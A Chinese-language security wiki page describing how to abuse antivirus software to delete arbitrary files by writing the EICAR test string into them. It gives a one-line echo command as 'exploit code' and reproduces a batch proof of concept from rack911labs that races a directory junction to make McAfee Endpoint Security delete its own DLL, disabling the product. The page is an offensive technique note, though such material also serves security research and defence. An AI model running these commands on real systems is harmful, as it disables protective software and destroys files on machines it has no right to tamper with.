# 利用杀毒软件删除任意文件

## 简介

通常，下载一个未知文件保存到硬盘后，杀毒软件通常会在短时间进行实时扫描，如果确定为可疑或威胁，该文件会被自动隔离，并询问用户是否处理。

考虑到杀毒软件几乎都已高权限运行，这样就为我们对杀毒软件利用产生了条件，我们可以往一个合法文件里写入恶意代码特征，然后利用杀毒软件帮我去删除这个文件，当然前提是这个文件当前没有使用。

## 测试字符串

```text
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

> **来自维基百科:**
>
> **EICAR标准反病毒测试文件**，又称**EICAR测试文件**, 是由[欧洲反计算机病毒协会](https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%B4%B2%E5%8F%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E5%8D%8F%E4%BC%9A)（EICAR）与[计算机病毒研究组织](https://zh.wikipedia.org/w/index.php?title=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E7%A0%94%E7%A9%B6%E7%BB%84%E7%BB%87&action=edit&redlink=1)（CARO）研制的文件, 用以测试[杀毒软件](https://zh.wikipedia.org/wiki/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6)的响应程度。不同于使用可能造成实际破环的实体恶意软件，该文件允许人们在没有计算机病毒的情况下测试杀毒软件。
>
> 杀毒软件的开发者将EICAR字符串视为测试病毒，与其他鉴别标识相似。合格的病毒扫描器在发现文件时，会精确地采用相同方式处置，如同发现一个严重的病毒时那样。注意并非所有病毒扫描器是合格的，有些病毒扫描器会在精确识别后保留文件。
>
> EICAR测试字符的用法要比直接测试灵活：包含EICAR测试字符的文件会被[压缩](https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%8E%8B%E7%BC%A9)或者[存档](https://zh.wikipedia.org/wiki/%E5%AD%98%E6%A1%A3)，并且杀毒软件会尝试删除压缩文件中的测试字符。

简单的说为了测试杀毒软件的性能,所有厂商都会把这个测试字符串当作病毒处理。

![](../.gitbook/assets/image%20%2869%29.png)

预想一个场景，在杀毒软件运行时考虑到内存占用可能并不会加载所有自身dll，那我们往这个未加载的dll里写入这个测试字符串，这样杀毒软件就会自己干掉自己，等到需要用到这个功能dll的时候，这个功能就会失效。

## 利用流程

1. 往文件写入测试字符串

## 利用代码

```text
echo X5O!P%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*  > <FILENAME>
```

## 扩展利用

windows提供了一个目录链接功能，只能将两个目录链接在一起。它不能链接文件，并且目录必须在文件系统本地。目录连接可以由任何用户执行，并且不需要管理员特权，因此非常适合在Windows操作系统下利用防病毒软件进行利用。

此poc来自rack911labs:

```text
:loop
rd /s /q C:\Users\Username\Desktop\exploit
mkdir C:\Users\Username\Desktop\exploit
echo X5O!P%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* > C:\Users\Username\Desktop\exploit\EpSecApiLib.dll
rd /s /q C:\Users\Username\Desktop\exploit
mklink /J C:\Users\Username\Desktop\exploit “C:\Program Files (x86)\McAfee\Endpoint Security\Endpoint Security Platform”
goto loop
```

## LINKS

{% embed url="https://zh.wikipedia.org/wiki/EICAR%E6%A0%87%E5%87%86%E5%8F%8D%E7%97%85%E6%AF%92%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6" %}

{% embed url="https://www.rack911labs.com/research/exploiting-almost-every-antivirus-software/" %}

